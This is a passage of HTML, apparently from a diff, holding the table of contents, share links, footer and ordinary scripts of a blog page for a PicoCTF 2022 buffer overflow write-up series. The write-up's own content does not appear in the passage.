toc-level-2"><a class="toc-link" href="#Buffer-overflow-2"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-The-Hard-Way-%F0%9F%90%A2"><span class="toc-number">1.</span> <span class="toc-text">I: The Hard Way 🐢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-The-Easy-Way-%F0%9F%90%87"><span class="toc-number">2.</span> <span class="toc-text">II: The Easy Way 🐇</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-3"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-Finding-the-Canary-%F0%9F%90%A6"><span class="toc-number">1.</span> <span class="toc-text">I: Finding the Canary 🐦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-Bypassing-the-Canary-%F0%9F%92%A8"><span class="toc-number">2.</span> <span class="toc-text">II: Bypassing the Canary 💨</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&text=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&title=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&is_video=false&description=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PicoCTF 2022: Buffer Overflow Series&body=Check out this article: https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&title=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&name=PicoCTF 2022: Buffer Overflow Series&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
+        
+            <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+          
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    enscribe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
